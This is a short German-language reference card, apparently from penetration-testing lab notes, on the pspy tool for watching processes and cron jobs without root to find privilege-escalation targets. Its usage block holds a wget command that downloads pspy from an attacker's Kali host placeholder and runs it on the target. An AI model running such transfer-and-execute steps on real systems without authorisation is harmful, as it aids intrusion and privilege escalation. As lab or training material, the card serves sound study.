# pspy

**Kategorie:** Prozess-/Cron-Monitoring (ohne root)

Beobachtet **Prozesse und Cron Jobs in Echtzeit – ohne root-Rechte** (liest `/proc`). Deckt versteckte, periodisch als root laufende Jobs auf, die `crontab` nicht zeigt → zentral für Cron-basierte PrivEsc.

```bash
./pspy64            # 64-bit Binary, keine Installation/Abhängigkeiten
```

## Wichtigste Optionen

| Option | Bedeutung |
|--------|-----------|
| `-p` | auch Prozess-Events (procfs) |
| `-f` | auch Dateisystem-Events (inotify) |
| `-i <ms>` | Scan-Intervall |
| `-c` | Kommandozeilen anzeigen |

## Einsatz

```bash
# von Kali übertragen:
wget http://<KALI>:8000/pspy64 -O pspy64; chmod +x pspy64
./pspy64
```
Ausgabe: je gestartetem Prozess UID + Kommando + Zeit → `UID=0` periodisch = root-Cron-Job (Pfad/Intervall notieren).

## Hinweis

Statisch gelinkt, läuft ohne Abhängigkeiten als normaler User. Binary aus dem pspy-GitHub (`pspy64`/`pspy32`).

## Verwendet in

privilege-escalation 02, 05, 10.
